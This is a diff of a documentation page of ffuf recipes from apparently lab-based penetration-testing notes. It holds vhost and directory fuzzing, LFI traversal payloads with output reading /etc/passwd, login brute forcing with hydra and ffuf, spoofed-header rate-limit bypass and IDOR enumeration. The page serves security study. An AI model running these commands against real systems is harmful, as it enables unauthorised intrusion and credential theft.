@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/ffuf.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Compare virtual-host responses against a baseline
+[Search this tool’s saved examples](/commands/notebook?tool=ffuf) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Compare virtual-host responses against a baseline
 
 **Run in:** Kali. **Requires:** A reachable application, hostname candidates and the measured size of a known nonexistent virtual host response.
 
@@ -21,154 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 ffuf -w names.txt -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN_FQDN' -mc all -fs BASELINE_SIZE
 ```
 
-**Read the result:** Compare hits with a known-missing baseline and inspect the actual responses before accepting status/size filters.
-
-**If Every candidate looks identical or useful responses disappear:** Wildcard routes, authentication redirects and identical lengths can hide real pages or create false positives; FUZZ placement defines what is tested.
+**What the result establishes:** Compare hits with a known-missing baseline and inspect the actual responses before accepting status/size filters.
 
 **Next check:** Revisit the filter using an invalid control; confirm a distinct host manually with the same Host header and session.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/ffuf/ffuf)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## ffuf: choose the operation and read the result
-
-Discover web paths, parameters or virtual hosts.
-
-### What the result establishes
-
-Compare hits with a known-missing baseline and inspect the actual responses before accepting status/size filters.
-
-### Prerequisites and common failures
-
-Wildcard routes, authentication redirects and identical lengths can hide real pages or create false positives; FUZZ placement defines what is tested.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-ffuf -w WORDLIST -u http://TARGET_IP/FUZZ
-ffuf -w WORDLIST -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN' -fs DEFAULT_RESPONSE_SIZE
-```
-
-### Example 2: VHost Fuzzing with ffuf
-
-Run in: **Saved lab example**.
-
-```bash
-# Initial run — observe default response size
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -u http://<target> -H "Host: FUZZ.<domain>"
-
-# Filter false positives by size
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -u http://<target> -H "Host: FUZZ.<domain>" -fs <default-size>
-```
-
-Saved context: [DNS and Web Reconnaissance: Full Workflow — VHost Fuzzing with ffuf](/recon/dns-web-recon-cheat-sheet#vhost-fuzzing-with-ffuf). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Full Recon Workflow
-
-Run in: **Saved lab example**.
-
-```text
-Passive Recon
-├── CT logs (crt.sh) → subdomains that ever had a cert
-├── DNS enumeration → public DNS records
-├── WHOIS / Shodan → infrastructure intel
-└── No target contact
-
-Active Recon
-├── Zone transfer attempt (dig axfr) → dump DNS if misconfigured
-├── VHost fuzzing (ffuf/gobuster) → hidden vhosts
-├── Fingerprinting (WhatWeb/Nikto/Nmap) → tech stack
-├── WAF detection (wafw00f) → security layer check
-└── Direct interaction with target
-
-Post-Discovery
-├── Add found vhosts/subdomains to /etc/hosts
-├── Run CMS-specific scanners (WPScan, JoomScan)
-├── Enumerate each attack surface
-└── Prioritise dev/staging environments (weaker security)
-```
-
-Saved context: [DNS and Web Reconnaissance: Full Workflow — Full Recon Workflow](/recon/dns-web-recon-cheat-sheet#full-recon-workflow). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Complete Recon Methodology
-
-Run in: **Saved lab example**.
-
-```text
-Passive Recon (no target contact)
-├── CT logs (crt.sh) → subdomains that ever had a cert
-├── Google dorking → exposed files, login pages, config leaks
-├── DNS enumeration → public DNS records
-├── WHOIS / Shodan → infrastructure intel
-├── .well-known URIs → security.txt, openid-config
-└── theHarvester → emails, hosts from public sources
-
-Active Recon (direct target interaction)
-├── Zone transfer attempt (dig axfr) → dump DNS if misconfigured
-├── VHost fuzzing (ffuf/gobuster) → hidden vhosts
-├── Fingerprinting (WhatWeb/Nikto/Nmap) → tech stack
-├── WAF detection (wafw00f) → security layer check
-├── Web crawling (Scrapy/Burp/ZAP) → site map, links, files
-├── robots.txt / sitemap.xml → hidden paths, structure
-└── Directory brute force → unlisted pages
-
-Post-Discovery
-├── Add found vhosts/subdomains to /etc/hosts
-├── Run CMS-specific scanners (WPScan, JoomScan)
-├── Analyse extracted data (emails, comments, JS files)
-├── Enumerate each attack surface
-└── Prioritise dev/staging environments (weaker security)
-```
-
-Saved context: [DNS and Web Reconnaissance: Full Workflow — Complete Recon Methodology](/recon/dns-web-recon-cheat-sheet#complete-recon-methodology). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Web enumeration (if applicable)
-
-Run in: **Saved lab example**.
-
-```bash
-# ffuf / gobuster / feroxbuster commands
-```
-
-Saved context: [HTB Box Note Template — Web enumeration (if applicable)](/templates/box-note#web-enumeration-if-applicable). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Earlier notebook reference
-
-Run in: **Saved lab example**.
-
-```bash
-# Fingerprint
-whatweb http://$IP
-curl -sI http://$IP            # headers, server, redirects
-# Directory / file discovery
-feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
-gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
-# Virtual host (subdomain) discovery — match on response size to filter noise
-ffuf -H "Host: FUZZ.$DOMAIN" -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
-```
-
-Saved context: [Web Enumeration — Earlier notebook reference](/web/web-enumeration#earlier-notebook-reference). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Discover web paths, parameters or virtual hosts.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=ffuf) · [All tools](/index)
 
 ## Commands
 
@@ -179,13 +42,194 @@ ffuf -w WORDLIST -u http://TARGET_IP/FUZZ
 ffuf -w WORDLIST -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN' -fs DEFAULT_RESPONSE_SIZE
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Every candidate looks identical or useful responses disappear | Wildcard routes, authentication redirects and identical lengths can hide real pages or create false positives; FUZZ placement defines what is tested. |
 
 ## Notebook recipes
 
-6 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+25 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
+
+<Accordion title="Phase 1: External Perimeter &amp; DMZ Foothold">
+
+### Phase 1: External Perimeter & DMZ Foothold
+
+**Attacking Enterprise Networks**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN_FQDN' -mc all -fs BASELINE_SIZE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Enterprise Networks — Phase 1: External Perimeter & DMZ Foothold](/methodology/enterprise-networks#phase-1-external-perimeter-&-dmz-foothold)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2. Subdomain &amp; Virtual Host (VHost) Discovery">
+
+### 2. Subdomain & Virtual Host (VHost) Discovery
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+# Step 1: Measure the default response size for a guaranteed nonexistent VHost
+curl -s -I -H 'Host: nonexistent-vhost-9912.DOMAIN_FQDN' http://TARGET_IP/
+curl -s -H 'Host: nonexistent-vhost-9912.DOMAIN_FQDN' http://TARGET_IP/ | wc -c
+
+# Step 2: Fuzz VHosts and filter out the baseline byte size (-fs) or word count (-fw)
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN_FQDN' -mc all -fs BASELINE_SIZE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — 2. Subdomain & Virtual Host (VHost) Discovery](/web/ffuf-guide#2-subdomain-&-virtual-host-vhost-discovery)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Basic Directory Discovery">
+
+### Basic Directory Discovery
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+  -u http://TARGET_IP/FUZZ -ic
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — Basic Directory Discovery](/web/ffuf-guide#basic-directory-discovery)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Extension Discovery &amp; Page Fuzzing">
+
+### Extension Discovery & Page Fuzzing
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+# 1. Identify the server's backend extension
+ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
+  -u http://TARGET_IP/indexFUZZ
+
+# 2. Fuzz pages with discovered + backup extensions
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+  -u http://TARGET_IP/FUZZ -e .php,.phps,.bak,.txt,.conf -ic
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — Extension Discovery & Page Fuzzing](/web/ffuf-guide#extension-discovery-&-page-fuzzing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="GET Parameter Discovery">
+
+### GET Parameter Discovery
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://DOMAIN_FQDN/admin/admin.php?FUZZ=key' -fs BASELINE_SIZE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — GET Parameter Discovery](/web/ffuf-guide#get-parameter-discovery)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="POST Parameter Discovery">
+
+### POST Parameter Discovery
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+  -u 'http://DOMAIN_FQDN/admin/admin.php' \
+  -X POST -d 'FUZZ=key' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -fs BASELINE_SIZE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — POST Parameter Discovery](/web/ffuf-guide#post-parameter-discovery)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Recursive Fuzzing">
+
+### Recursive Fuzzing
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+  -u http://TARGET_IP/FUZZ -recursion -recursion-depth 1 -e .php -v -ic
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — Recursive Fuzzing](/web/ffuf-guide#recursive-fuzzing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Value &amp; ID Fuzzing (Custom Numeric / Wordlist Ranges)">
+
+### Value & ID Fuzzing (Custom Numeric / Wordlist Ranges)
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+# Generate a numeric ID list (1..1000) and fuzz the discovered parameter
+seq 1 1000 > ids.txt
+ffuf -w ids.txt:FUZZ -u 'http://DOMAIN_FQDN/admin/admin.php' \
+  -X POST -d 'id=FUZZ' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -fs BASELINE_SIZE
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — Value & ID Fuzzing (Custom Numeric / Wordlist Ranges)](/web/ffuf-guide#value-&-id-fuzzing-custom-numeric-/-wordlist-ranges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
 
 <Accordion title="Complete Recon Methodology">
 
@@ -289,30 +333,326 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
 
 </Accordion>
 
-<Accordion title="Web enumeration (if applicable)">
+<Accordion title="Fuzzing Parameters">
 
-### Web enumeration (if applicable)
+### Fuzzing Parameters
 
-**HTB Box Note Template**
+**File Inclusion — HTB Module**
 
-```bash
-# ffuf / gobuster / feroxbuster commands
+```text
+grcic550@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
+ :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [HTB Box Note Template — Web enumeration (if applicable)](/templates/box-note#web-enumeration-if-applicable)
+**Original note sections:** [File Inclusion — HTB Module — Fuzzing Parameters](/web/htb/file-inclusion#fuzzing-parameters)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Web Enumeration: Quick Commands">
+<Accordion title="Fuzzing for PHP Files">
 
-### Web Enumeration: Quick Commands
+### Fuzzing for PHP Files
 
-**Web Enumeration: Quick Commands**
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+
+...SNIP...
+
+index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
+config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Fuzzing for PHP Files](/web/htb/file-inclusion#fuzzing-for-php-files)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="LFI wordlists">
+
+### LFI wordlists
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
+ :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
+...SNIP...
+../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — LFI wordlists](/web/htb/file-inclusion#lfi-wordlists)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Server Logs/Configurations">
+
+### Server Logs/Configurations
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
+ :: Wordlist         : FUZZ: ./LFI-WordList-Linux
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
+/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
+/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
+/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
+/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
+/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
+...SNIP...
+/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
+/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
+/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
+/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Server Logs/Configurations](/web/htb/file-inclusion#server-logs/configurations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Server Webroot">
+
+### Server Webroot
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+...SNIP...
+
+: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — Server Webroot](/web/htb/file-inclusion#server-webroot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Bounded enumeration after confirmation">
+
+### Bounded enumeration after confirmation
+
+**IDOR and API Authorization**
+
+```bash
+seq 1 100 > lab-user-ids.txt
+ffuf -w lab-user-ids.txt -u "$BASE/api.php/user/FUZZ" \
+  -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  -H 'Accept-Encoding: identity' -mc all -rate 5 -t 2 \
+  -of json -o evidence/idor/results.json -od evidence/idor/responses
+jq -r '.results[] | [.input.FUZZ,.status,.length,.url] | @tsv' evidence/idor/results.json
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Bounded enumeration after confirmation](/web/idor#bounded-enumeration-after-confirmation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Enumerate parameters and file locations systematically">
+
+### Enumerate parameters and file locations systematically
+
+**LFI / RFI**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -u "$BASE/index.php?FUZZ=note-probe" -fs BASELINE_BYTES
+
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -u "$BASE/index.php?language=FUZZ" -fs BASELINE_BYTES
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Enumerate parameters and file locations systematically](/web/lfi-rfi#enumerate-parameters-and-file-locations-systematically)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Bypassing Weak IP Rate Limiting via Spoofed Headers">
+
+### Bypassing Weak IP Rate Limiting via Spoofed Headers
+
+**Login Brute Forcing**
+
+```bash
+ffuf -w pass.txt:PASS -u http://TARGET_IP/login.php -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'X-Forwarded-For: 127.0.0.1' \
+  -d 'username=admin&password=PASS' -fr 'Invalid'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Login Brute Forcing — Bypassing Weak IP Rate Limiting via Spoofed Headers](/web/login-brute-forcing#bypassing-weak-ip-rate-limiting-via-spoofed-headers)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="HTTP Basic / Digest Authentication">
+
+### HTTP Basic / Digest Authentication
+
+**Login Brute Forcing**
+
+```bash
+# Hydra http-get against Basic Auth endpoint
+hydra -L users.txt -P pass.txt -u TARGET_IP -s PORT http-get /admin/
+
+# ffuf Basic Auth using base64-encoded user:pass pairs
+ffuf -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt:FUZZ \
+  -u http://TARGET_IP/admin/ -H 'Authorization: Basic FUZZ' -enc FUZZ:b64 -fc 401
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Login Brute Forcing — HTTP Basic / Digest Authentication](/web/login-brute-forcing#http-basic-/-digest-authentication)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="JSON API Login Endpoints (ffuf)">
+
+### JSON API Login Endpoints (ffuf)
+
+**Login Brute Forcing**
+
+```bash
+ffuf -w users.txt:USER -w pass.txt:PASS \
+  -u http://TARGET_IP/api/login -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"USER","password":"PASS"}' \
+  -fr 'Invalid|Unauthorized' -fc 401
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Login Brute Forcing — JSON API Login Endpoints (ffuf)](/web/login-brute-forcing#json-api-login-endpoints-ffuf)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Configure Listener &amp; FoxyProxy">
+
+### Configure Listener & FoxyProxy
+
+**Using Web Proxies (Burp Suite & OWASP ZAP)**
+
+```bash
+# Route curl / ffuf / sqlmap through Burp (127.0.0.1:8080)
+curl -sk -x http://127.0.0.1:8080 https://TARGET_IP/
+ffuf -w WORDLIST -u http://TARGET_IP/FUZZ -x http://127.0.0.1:8080
+sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Using Web Proxies (Burp Suite & OWASP ZAP) — Configure Listener & FoxyProxy](/web/web-proxies#configure-listener-&-foxyproxy)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Choose the next technical note">
+
+### Choose the next technical note
+
+**Web Enumeration**
 
 ```bash
 # Fingerprint
@@ -327,28 +667,50 @@ ffuf -H "Host: FUZZ.$DOMAIN" -u http://$IP -w /usr/share/seclists/Discovery/DNS/
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Web Enumeration — Earlier notebook reference](/web/web-enumeration#earlier-notebook-reference)
+**Original note sections:** [Web Enumeration — Choose the next technical note](/web/web-enumeration#choose-the-next-technical-note)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Web Protocols &amp; Recon">
+<Accordion title="Discover content, then inspect useful hits">
 
-### Web Protocols & Recon
+### Discover content, then inspect useful hits
 
-**Ports, Protocols, and Services by Purpose**
+**Web Enumeration**
 
-Context from the notebook: ffuf VHost/dir fuzzing ffuf -w wordlist -u `http://<IP>` -H "Host: FUZZ.domain"
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
+  -u "$BASE/FUZZ" -ac -of json -o content.json
 
-```text
-ffuf -w wordlist -u http://<IP> -H "Host: FUZZ.domain"
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
+  -u "$BASE/FUZZ" -e .php,.txt,.html -ac
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Web Protocols & Recon](/reference/master-protocol-service-quick-reference#web-protocols-&-recon)
+**Original note sections:** [Web Enumeration — Discover content, then inspect useful hits](/web/web-enumeration#discover-content-then-inspect-useful-hits)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Virtual-host discovery">
+
+### Virtual-host discovery
+
+**Web Enumeration**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -u "http://$IP/" -H 'Host: FUZZ.app.htb' -fs BASELINE_BYTES
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Virtual-host discovery](/web/web-enumeration#virtual-host-discovery)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -357,6 +719,10 @@ ffuf -w wordlist -u http://<IP> -H "Host: FUZZ.domain"
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/ffuf/ffuf)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -364,5 +730,3 @@ ffuf -w wordlist -u http://<IP> -H "Host: FUZZ.domain"
 - [DNS and Web Reconnaissance: Full Workflow](/recon/dns-web-recon-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
